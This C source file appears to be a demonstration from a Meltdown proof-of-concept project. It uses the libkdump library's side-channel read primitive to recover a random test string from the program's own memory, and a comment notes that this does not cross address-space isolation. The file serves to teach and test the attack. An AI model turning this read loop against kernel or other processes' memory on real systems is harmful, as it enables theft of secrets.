#include "libkdump.h"
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

//该实验利用meltdown读取本进程可访问的地址空间，没有打破地址空间隔离
const char *strings[] = {
    "If you can read this, at least the auto configuration is working",
    "Generating witty test message...",
    "Go ahead with the real exploit if you dare",
    "Have a good day.",
    "Welcome to the wonderful world of microarchitectural attacks",
    "Pay no attention to the content of this string",
    "Please wait while we steal your secrets...",
    "Would you like fries with that?",
    "(insert random quote here)",
    "Don't panic...",
    "Wait, do you smell something burning?",
    "How did you get here?"};

int main(int argc, char *argv[]) {
  libkdump_config_t config;
  config = libkdump_get_autoconfig();
  libkdump_init(config);

  srand(time(NULL));
  //随机得到一个字符串
  const char *test = strings [rand() % (sizeof(strings) / sizeof(strings[0]))];
  int index = 0;

  printf("Expect: \x1b[32;1m%s\x1b[0m\n", test);
  printf("   Got: \x1b[33;1m");
  
  while (index < strlen(test)) {
    int value = libkdump_read((size_t)(test + index));
    if (!isprint(value))
      continue;

    printf("%c", value);
    fflush(stdout);
    index++;
  }

  printf("\x1b[0m\n");
  libkdump_cleanup();

  return 0;
}
